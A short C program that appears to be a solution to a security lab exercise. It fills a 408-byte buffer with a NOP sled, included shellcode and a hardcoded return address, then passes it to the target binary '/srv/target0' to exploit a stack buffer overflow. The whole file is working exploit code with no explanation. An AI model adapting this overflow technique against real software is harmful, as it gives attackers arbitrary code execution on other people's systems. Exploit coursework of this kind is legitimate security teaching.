#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target0"

const int BSIZE = 408;
const int SHSIZE = sizeof(shellcode) - 1;
const uint32_t ADD = 0xffffdb2c;

void prep(char *buf) {
    memset(buf, 0x90, BSIZE);
    buf[BSIZE] = '\0';
    memcpy(buf, shellcode, SHSIZE);
    *(uint32_t*)(buf + BSIZE - 4) = ADD;
}

int main(void) {
    char buf[BSIZE + 1];
    char *args[3] = {TARGET, buf, NULL};
    char *env[1] = {NULL};

    prep(buf);
    execve(TARGET, args, env);
    fprintf(stderr, "execve failed.\n");

    return 0;
}